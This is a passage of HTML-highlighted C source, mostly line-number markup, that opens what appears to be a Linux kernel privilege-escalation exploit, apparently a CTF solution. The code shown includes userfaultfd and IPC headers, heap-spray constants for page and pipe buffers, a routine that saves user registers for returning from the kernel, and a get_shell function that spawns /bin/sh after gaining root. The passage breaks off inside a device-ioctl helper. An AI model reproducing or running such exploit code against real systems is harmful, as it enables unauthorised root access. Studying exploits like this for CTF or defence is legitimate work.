class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_4PAGES_START_IDX 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_8PAGES_START_IDX 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">option</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 